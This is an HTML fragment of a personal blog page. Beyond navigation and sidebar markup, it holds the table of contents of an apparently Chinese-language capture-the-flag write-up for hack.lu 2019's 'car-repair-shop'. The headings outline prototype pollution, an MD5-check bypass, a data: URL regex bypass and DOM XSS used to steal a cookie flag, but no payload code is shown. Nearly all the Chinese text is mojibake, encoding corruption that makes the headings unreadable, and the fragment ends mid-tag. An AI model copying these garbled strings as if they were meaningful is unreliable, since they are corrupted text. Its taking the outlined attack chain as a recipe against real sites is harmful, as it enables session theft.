              <a href="/2019/12/21/2019hack-luCTFçš„numtonceçš„ç¯å¢ƒæ­å»ºåˆ°è§£å†³çš„è¯¦ç»†è¿‡ç¨‹/" rel="prev" title="2019hack.luCTFçš„numtonceçš„ç¯å¢ƒæ­å»ºåˆ°è§£å†³çš„è¯¦ç»†è¿‡ç¨‹">
                2019hack.luCTFçš„numtonceçš„ç¯å¢ƒæ­å»ºåˆ°è§£å†³çš„è¯¦ç»†è¿‡ç¨‹ <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            æ–‡ç« ç›®å½•
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            ç«™ç‚¹æ¦‚è§ˆ
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">30</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                å‹æƒ…é“¾æ¥
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#å‰è¨€"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#car-repair-shop"><span class="nav-number">1.1.</span> <span class="nav-text">car-repair-shop</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#é¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚"><span class="nav-number">1.2.</span> <span class="nav-text">é¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSS"><span class="nav-number">1.2.1.</span> <span class="nav-text">åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSS</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#é¢˜ç›®æè¿°ï¼š"><span class="nav-number">1.3.</span> <span class="nav-text">é¢˜ç›®æè¿°ï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#é¢˜ç›®åœ°å€å¦‚ä¸‹Enter-the-shop"><span class="nav-number">1.3.1.</span> <span class="nav-text">é¢˜ç›®åœ°å€å¦‚ä¸‹Enter the shop</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#é¢˜ç›®åˆ†æï¼š"><span class="nav-number">1.4.</span> <span class="nav-text">é¢˜ç›®åˆ†æï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#è®¿é—®é¢˜ç›®ç»™çš„é“¾æ¥åå°†å‘ˆç°ä¸‹é¢çš„ç•Œé¢ï¼š"><span class="nav-number">1.4.1.</span> <span class="nav-text">è®¿é—®é¢˜ç›®ç»™çš„é“¾æ¥åå°†å‘ˆç°ä¸‹é¢çš„ç•Œé¢ï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ ä¸ªæŒ‰é’®ï¼Œå•å‡»è¿™äº›æŒ‰é’®å°†æ‰§è¡ŒæŸäº›åŠŸèƒ½ã€‚"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ ä¸ªæŒ‰é’®ï¼Œå•å‡»è¿™äº›æŒ‰é’®å°†æ‰§è¡ŒæŸäº›åŠŸèƒ½ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶ˆæ¯æ¡†ï¼Œè¯¥æ¶ˆæ¯æ¡†åœ¨æ‰§è¡ŒæŸäº›åŠŸèƒ½åä¼šæ›´æ–°å†…å®¹ã€‚"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶ˆæ¯æ¡†ï¼Œè¯¥æ¶ˆæ¯æ¡†åœ¨æ‰§è¡ŒæŸäº›åŠŸèƒ½åä¼šæ›´æ–°å†…å®¹ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#åœ¨åº•éƒ¨ï¼Œè¿˜æœ‰ä¸€ä¸ªåä¸ºget-your-cookieçš„æŒ‰é’®ï¼Œè¯¥æŒ‰é’®å°†å¯¼è‡´ä¸€ä¸ªå¯ä»¥å¼•ç”¨URLçš„å­é¡µé¢"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">åœ¨åº•éƒ¨ï¼Œè¿˜æœ‰ä¸€ä¸ªåä¸ºget your cookieçš„æŒ‰é’®ï¼Œè¯¥æŒ‰é’®å°†å¯¼è‡´ä¸€ä¸ªå¯ä»¥å¼•ç”¨URLçš„å­é¡µé¢</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æäº¤urlåæµè§ˆå™¨å°†ä¼šè‡ªåŠ¨è®¿é—®ã€‚"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">æäº¤urlåæµè§ˆå™¨å°†ä¼šè‡ªåŠ¨è®¿é—®ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸ªå¤§å›¾çœ‹èµ·æ¥æˆ‘ä»¬éœ€è¦å»æ„é€ ä¸€ä¸ªurlåŒ…å«æˆ‘ä»¬çš„payloadå»æäº¤å®ƒã€‚"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">è¿™ä¸ªå¤§å›¾çœ‹èµ·æ¥æˆ‘ä»¬éœ€è¦å»æ„é€ ä¸€ä¸ªurlåŒ…å«æˆ‘ä»¬çš„payloadå»æäº¤å®ƒã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å½“ä»–è¢«è®¿é—®æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»ä»¥æŸç§æ–¹å¼å‚å…¥è¿™ä¸ªflagã€‚"><span class="nav-number">1.4.1.6.</span> <span class="nav-text">å½“ä»–è¢«è®¿é—®æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»ä»¥æŸç§æ–¹å¼å‚å…¥è¿™ä¸ªflagã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸ªæŒ‰é’®çš„åå­—ä¸ªæ•°æˆ‘ä»¬è¿™ä¸ªflagåœ¨cookieé‡Œé¢ã€‚"><span class="nav-number">1.4.1.7.</span> <span class="nav-text">è¿™ä¸ªæŒ‰é’®çš„åå­—ä¸ªæ•°æˆ‘ä»¬è¿™ä¸ªflagåœ¨cookieé‡Œé¢ã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è¯¥é¡µé¢å¾ˆå°å¹¶ä¸”åŒ…å«äº†å…¶ä»–å‡ ä¸ªæœ‰è¶£çš„æ–‡ä»¶ï¼š"><span class="nav-number">1.4.2.</span> <span class="nav-text">è¯¥é¡µé¢å¾ˆå°å¹¶ä¸”åŒ…å«äº†å…¶ä»–å‡ ä¸ªæœ‰è¶£çš„æ–‡ä»¶ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#util-jsè´Ÿè´£å»ºç«‹ç±»ä¼¼äºäº‹ä»¶å¤„ç†ç¨‹åºçš„é¡µé¢ï¼Œç„¶åå¼€å§‹æ‰§è¡Œä¸€äº›ä»£ç ã€‚"><span class="nav-number">1.4.3.</span> <span class="nav-text">util.jsè´Ÿè´£å»ºç«‹ç±»ä¼¼äºäº‹ä»¶å¤„ç†ç¨‹åºçš„é¡µé¢ï¼Œç„¶åå¼€å§‹æ‰§è¡Œä¸€äº›ä»£ç ã€‚</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™autoStartå‡½æ•°å°†ä¼šæ‰§è¡Œrepairï¼Œignitionå’ŒpowerOnæ±½è½¦çš„æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ é€’ã€‚"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">è¿™autoStartå‡½æ•°å°†ä¼šæ‰§è¡Œrepairï¼Œignitionå’ŒpowerOnæ±½è½¦çš„æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™repairå‡½æ•°è®¿é—®è¯¥URLå¹¶è§£æä¸ç›¸åŒåç§°çš„åŠŸèƒ½çš„æŸ¥è¯¢å‚æ•°çš„JSONå¯¹è±¡ï¼š"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">è¿™repairå‡½æ•°è®¿é—®è¯¥URLå¹¶è§£æä¸ç›¸åŒåç§°çš„åŠŸèƒ½çš„æŸ¥è¯¢å‚æ•°çš„JSONå¯¹è±¡ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¯¥ä»£ç å°†JSONå¯¹è±¡ä¸­æä¾›çš„å±æ€§å’Œå€¼ä¸è¯¥Carå¯¹è±¡åˆå¹¶ã€‚è¿™å¾ˆå±é™©ï¼Œå¹¶ä¸”ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¯¦ç»†ä»‹ç»è¯·çœ‹æ­¤å¤„"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">è¯¥ä»£ç å°†JSONå¯¹è±¡ä¸­æä¾›çš„å±æ€§å’Œå€¼ä¸è¯¥Carå¯¹è±¡åˆå¹¶ã€‚è¿™å¾ˆå±é™©ï¼Œå¹¶ä¸”ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¯¦ç»†ä»‹ç»è¯·çœ‹æ­¤å¤„</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬èƒ½é‡å†™Carçš„-proto-å±æ€§ï¼Œå¹¶ä¸”å¼•å…¥å…¶ä»–çš„å±æ€§ã€‚"><span class="nav-number">1.4.3.4.</span> <span class="nav-text">æˆ‘ä»¬èƒ½é‡å†™Carçš„__proto__å±æ€§ï¼Œå¹¶ä¸”å¼•å…¥å…¶ä»–çš„å±æ€§ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ¥ä¸‹æ¥æ˜¯è¿™ä¸ªignitionå‡½æ•°ã€‚"><span class="nav-number">1.4.3.5.</span> <span class="nav-text">æ¥ä¸‹æ¥æ˜¯è¿™ä¸ªignitionå‡½æ•°ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¦ä¿®å¤ï¼Œbugattiæˆ‘ä»¬åªè¦keyåœ¨urlä¸­æŒ‡å®šemojiè¡¨æƒ…çš„å€¼ï¼Œç„¶årepair-functionå°†å®Œæˆå…¶å·¥ä½œï¼š"><span class="nav-number">1.4.3.6.</span> <span class="nav-text">è¦ä¿®å¤ï¼Œbugattiæˆ‘ä»¬åªè¦keyåœ¨urlä¸­æŒ‡å®šemojiè¡¨æƒ…çš„å€¼ï¼Œç„¶årepair-functionå°†å®Œæˆå…¶å·¥ä½œï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™å°†æŠŠæˆ‘ä»¬å¸¦åˆ°porscheã€‚è¿™é‡Œå¯¹repairå’Œç‚¹ç«åŠŸèƒ½è¿›è¡Œäº†ä¸€äº›è‡ªå®šä¹‰ï¼š"><span class="nav-number">1.4.3.7.</span> <span class="nav-text">è¿™å°†æŠŠæˆ‘ä»¬å¸¦åˆ°porscheã€‚è¿™é‡Œå¯¹repairå’Œç‚¹ç«åŠŸèƒ½è¿›è¡Œäº†ä¸€äº›è‡ªå®šä¹‰ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸ªignitionå‡½æ•°æ˜¯ä¸é‡è¦çš„ï¼Œå› ä¸ºä»–åªæ˜¯è¾“å‡ºä¸€äº›æ–‡æœ¬ã€‚"><span class="nav-number">1.4.3.8.</span> <span class="nav-text">è¿™ä¸ªignitionå‡½æ•°æ˜¯ä¸é‡è¦çš„ï¼Œå› ä¸ºä»–åªæ˜¯è¾“å‡ºä¸€äº›æ–‡æœ¬ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è€Œè¿™ä¸ªrepairå‡½æ•°æœ‰ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ã€‚"><span class="nav-number">1.4.3.9.</span> <span class="nav-text">è€Œè¿™ä¸ªrepairå‡½æ•°æœ‰ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-åœ¨bugattiå¯åŠ¨ä¹‹å‰ã€‚"><span class="nav-number">1.4.3.10.</span> <span class="nav-text">1. åœ¨bugattiå¯åŠ¨ä¹‹å‰ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-porscheå¯¹è±¡çš„MD5å€¼éœ€è¦æ˜¯9cdfb439c7876e703e307864c9167a15"><span class="nav-number">1.4.3.11.</span> <span class="nav-text">2. porscheå¯¹è±¡çš„MD5å€¼éœ€è¦æ˜¯9cdfb439c7876e703e307864c9167a15</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-å·²ç»ä½¿ç”¨äº†æ­£ç¡®çš„keyåœ¨urlä¸­ï¼Œæ˜¯éå¸¸å¥½çš„ã€‚"><span class="nav-number">1.4.3.12.</span> <span class="nav-text">(1) å·²ç»ä½¿ç”¨äº†æ­£ç¡®çš„keyåœ¨urlä¸­ï¼Œæ˜¯éå¸¸å¥½çš„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-éœ€è¦å»åšçš„æ˜¯ã€‚è¿™ä¸ªMD5çš„å€¼æ˜¯ç­‰äºè¿™ä¸ªå­—ç¬¦ä¸²lol-ä½ å¯ä»¥æŸ¥çœ‹æœ€å—æ¬¢è¿çš„hashè¡¨ï¼Œä¾‹å¦‚ï¼šcrackstation-net-ã€‚"><span class="nav-number">1.4.3.13.</span> <span class="nav-text">(2) éœ€è¦å»åšçš„æ˜¯ã€‚è¿™ä¸ªMD5çš„å€¼æ˜¯ç­‰äºè¿™ä¸ªå­—ç¬¦ä¸²lol(ä½ å¯ä»¥æŸ¥çœ‹æœ€å—æ¬¢è¿çš„hashè¡¨ï¼Œä¾‹å¦‚ï¼šcrackstation.net)ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#é‚£ä¹ˆæˆ‘ä»¬è¿™æ ·å»è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼å‘¢ï¼Ÿçœ‹åˆ°jquery-md5-jsä»–å±•ç°äº†è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼ï¼Œå°†æ˜¾ç¤ºçš„é€šè¿‡toStringæ–¹æ³•è·å¾—å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºçš„å“ˆå¸Œå€¼ã€‚"><span class="nav-number">1.4.3.14.</span> <span class="nav-text">é‚£ä¹ˆæˆ‘ä»¬è¿™æ ·å»è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼å‘¢ï¼Ÿçœ‹åˆ°jquery.md5.jsä»–å±•ç°äº†è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼ï¼Œå°†æ˜¾ç¤ºçš„é€šè¿‡toStringæ–¹æ³•è·å¾—å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºçš„å“ˆå¸Œå€¼ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¦æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦å»é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åœ¨è¿™æ˜¯ä¸å¯èƒ½çš„ã€‚"><span class="nav-number">1.4.3.15.</span> <span class="nav-text">è¦æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦å»é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åœ¨è¿™æ˜¯ä¸å¯èƒ½çš„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬ä¸èƒ½åˆ›å»ºæˆ–è€…æ”¹å˜è¿™ä¸ªæ–¹æ³•å¯¹äºé€šè¿‡jqueryçš„æ‰©å±•å¯¹äºrepairå‡½æ•°ï¼Œä»…ä»…æ”¹å˜å±æ€§ï¼Œç”±äºä»–æ˜¯JSONã€‚"><span class="nav-number">1.4.3.16.</span> <span class="nav-text">æˆ‘ä»¬ä¸èƒ½åˆ›å»ºæˆ–è€…æ”¹å˜è¿™ä¸ªæ–¹æ³•å¯¹äºé€šè¿‡jqueryçš„æ‰©å±•å¯¹äºrepairå‡½æ•°ï¼Œä»…ä»…æ”¹å˜å±æ€§ï¼Œç”±äºä»–æ˜¯JSONã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæœ‰è¶£çš„javaScriptæ•°ç»„å±æ€§å’Œå‰é¢æåˆ°çš„åŸå‹é“¾æ±¡æŸ“ã€‚å½“æ•°ç»„åœ¨javascriptä¸­è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä»–å°†æˆä¸ºç”±ç»„æˆçš„å…ƒç´ çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚"><span class="nav-number">1.4.3.17.</span> <span class="nav-text">ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæœ‰è¶£çš„javaScriptæ•°ç»„å±æ€§å’Œå‰é¢æåˆ°çš„åŸå‹é“¾æ±¡æŸ“ã€‚å½“æ•°ç»„åœ¨javascriptä¸­è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä»–å°†æˆä¸ºç”±ç»„æˆçš„å…ƒç´ çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å› æ­¤-quot-lol-quot-å˜æˆ-quot-lol-quot-ã€‚ç°åœ¨ç»“åˆåŸå‹é“¾çš„æ±¡æŸ“ï¼Œå¯ä»¥è½»æ¾çš„é€šè¿‡ä¸‹é¢çš„éªŒè¯ï¼š"><span class="nav-number">1.4.3.18.</span> <span class="nav-text">å› æ­¤[&quot;lol&quot;]å˜æˆ&quot;lol&quot;ã€‚ç°åœ¨ç»“åˆåŸå‹é“¾çš„æ±¡æŸ“ï¼Œå¯ä»¥è½»æ¾çš„é€šè¿‡ä¸‹é¢çš„éªŒè¯ï¼š</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½†æ˜¯åœ¨ï¼Œpayloadä¸­æˆ‘ä»¬æ— æ³•ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œå¦åˆ™æˆ‘å°†å¤±å»Carç±»æä¾›çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œè€Œæ˜¯å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„çš„å¯¹è±¡æ¥é¿å…è¿™ç§æƒ…å†µã€‚"><span class="nav-number">1.4.4.</span> <span class="nav-text">ä½†æ˜¯åœ¨ï¼Œpayloadä¸­æˆ‘ä»¬æ— æ³•ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œå¦åˆ™æˆ‘å°†å¤±å»Carç±»æä¾›çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œè€Œæ˜¯å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„çš„å¯¹è±¡æ¥é¿å…è¿™ç§æƒ…å†µã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç°åœ¨ï¼Œæ–°çš„payloadå¦‚ä¸‹ï¼š"><span class="nav-number">1.4.5.</span> <span class="nav-text">ç°åœ¨ï¼Œæ–°çš„payloadå¦‚ä¸‹ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¸ºä»€ä¹ˆä¸Šé¢çš„payloadèƒ½å¤Ÿå¤„ç†æˆåŠŸï¼Œä½ å¯ä»¥è‡ªå·±ä½“éªŒä¸€æ³¢ã€‚"><span class="nav-number">1.4.6.</span> <span class="nav-text">ä¸ºä»€ä¹ˆä¸Šé¢çš„payloadèƒ½å¤Ÿå¤„ç†æˆåŠŸï¼Œä½ å¯ä»¥è‡ªå·±ä½“éªŒä¸€æ³¢ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½¿ç”¨è¿™ä¸ªpayloadæˆ‘ä»¬ç»•è¿‡äº†MD5çš„æ£€æŸ¥ï¼Œæ¥ä¸‹æ¥å¤„ç†åˆ°äº†repairWithHelperå‡½æ•°ã€‚"><span class="nav-number">1.4.7.</span> <span class="nav-text">ä½¿ç”¨è¿™ä¸ªpayloadæˆ‘ä»¬ç»•è¿‡äº†MD5çš„æ£€æŸ¥ï¼Œæ¥ä¸‹æ¥å¤„ç†åˆ°äº†repairWithHelperå‡½æ•°ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åœ¨è¿™ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬çœ‹åˆ°å®ƒåˆ›å»ºäº†ä¸€ä¸ªscriptæ ‡ç­¾å¹¶ä¸”è®¾ç½®å®ƒçš„srcå±æ€§ä¸ºurlæä¾›ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°çš„ã€‚"><span class="nav-number">1.4.8.</span> <span class="nav-text">åœ¨è¿™ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬çœ‹åˆ°å®ƒåˆ›å»ºäº†ä¸€ä¸ªscriptæ ‡ç­¾å¹¶ä¸”è®¾ç½®å®ƒçš„srcå±æ€§ä¸ºurlæä¾›ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°çš„ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½¿ç”¨helpå‚æ•°æ¥æ§åˆ¶ä¼ å…¥ä¸Šé¢å‡½æ•°çš„å‚æ•°ã€‚"><span class="nav-number">1.4.9.</span> <span class="nav-text">ä½¿ç”¨helpå‚æ•°æ¥æ§åˆ¶ä¼ å…¥ä¸Šé¢å‡½æ•°çš„å‚æ•°ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æ¥ä¸‹æ¥æˆ‘ä»¬è¦é¢ä¸´çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»–çœ‹èµ·æ¥éå¸¸ä¸¥æ ¼ã€‚"><span class="nav-number">1.4.10.</span> <span class="nav-text">æ¥ä¸‹æ¥æˆ‘ä»¬è¦é¢ä¸´çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»–çœ‹èµ·æ¥éå¸¸ä¸¥æ ¼ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#URLçš„æœ€åä¸€éƒ¨åˆ†-æ–‡ä»¶å-åªèƒ½ä½¿ç”¨ä»»æ„çš„å­—ç¬¦ã€‚"><span class="nav-number">1.4.11.</span> <span class="nav-text">URLçš„æœ€åä¸€éƒ¨åˆ†(æ–‡ä»¶å)åªèƒ½ä½¿ç”¨ä»»æ„çš„å­—ç¬¦ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç»è¿‡ä¸€äº›æµ‹è¯•ï¼Œæˆ‘å‘ç°data-URLå°†ä¸regexåŒ¹é…data-lt-MIME-Type-gt-charset-lt-Charset-gt-base64-lt-Data-gt"><span class="nav-number">1.4.12.</span> <span class="nav-text">ç»è¿‡ä¸€äº›æµ‹è¯•ï¼Œæˆ‘å‘ç°data-URLå°†ä¸regexåŒ¹é…data:[&lt;MIME-Type&gt;][;charset=&lt;Charset&gt;][;base64],&lt;Data&gt;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¦‚æœå®ƒä¼šåŠ è½½æŸç§åƒåœ¾å†…å®¹ç±»å‹ï¼Œåˆ™åªæœ‰ä¸ç¡®å®šæ€§ï¼Œå› ä¸ºæ‰€éœ€çš„-fluxfingers-netä¸»æœºåå°†è¢«æ”¾ç½®ã€‚"><span class="nav-number">1.4.13.</span> <span class="nav-text">å¦‚æœå®ƒä¼šåŠ è½½æŸç§åƒåœ¾å†…å®¹ç±»å‹ï¼Œåˆ™åªæœ‰ä¸ç¡®å®šæ€§ï¼Œå› ä¸ºæ‰€éœ€çš„*.fluxfingers.netä¸»æœºåå°†è¢«æ”¾ç½®ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä»¤äººæƒŠè®¶çš„æ˜¯ä»–æ‰§è¡Œäº†ï¼Œå¹¶ä¸”å¼¹å‡ºäº†ä¸€ä¸ªalert-å¹¶ä¸”helpè®¾ç½®å¦‚ä¸‹ï¼š"><span class="nav-number">1.4.14.</span> <span class="nav-text">ä»¤äººæƒŠè®¶çš„æ˜¯ä»–æ‰§è¡Œäº†ï¼Œå¹¶ä¸”å¼¹å‡ºäº†ä¸€ä¸ªalert()å¹¶ä¸”helpè®¾ç½®å¦‚ä¸‹ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æ›´æ–°çš„payload"><span class="nav-number">1.4.15.</span> <span class="nav-text">æ›´æ–°çš„payload:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç°åœ¨æˆ‘ä»¬æœ‰äº†å®Œæ•´çš„åˆ©ç”¨é“¾ã€‚å”¯ä¸€ç¼ºå°‘çš„éƒ¨åˆ†å°±æ˜¯è¯»å–flag"><span class="nav-number">1.4.16.</span> <span class="nav-text">ç°åœ¨æˆ‘ä»¬æœ‰äº†å®Œæ•´çš„åˆ©ç”¨é“¾ã€‚å”¯ä¸€ç¼ºå°‘çš„éƒ¨åˆ†å°±æ˜¯è¯»å–flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è§£å†³"><span class="nav-number">1.4.17.</span> <span class="nav-text">è§£å†³:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#æœ€ç»ˆçš„payloadï¼ŒæˆåŠŸè¯»å–åˆ°flagï¼Œå¦‚ä¸‹å›¾ï¼š"><span class="nav-number">1.4.17.1.</span> <span class="nav-text">æœ€ç»ˆçš„payloadï¼ŒæˆåŠŸè¯»å–åˆ°flagï¼Œå¦‚ä¸‹å›¾ï¼š</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" 